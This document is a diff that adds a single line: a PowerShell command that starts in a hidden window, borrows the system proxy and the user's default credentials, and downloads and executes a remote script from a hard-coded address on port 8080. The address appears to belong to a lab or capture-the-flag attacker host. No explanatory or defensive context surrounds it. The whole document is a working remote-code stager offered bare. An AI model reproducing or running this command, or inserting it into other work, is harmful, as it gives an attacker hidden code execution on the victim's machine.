@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -c $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://10.10.14.13:8080/EwJompov6HX');
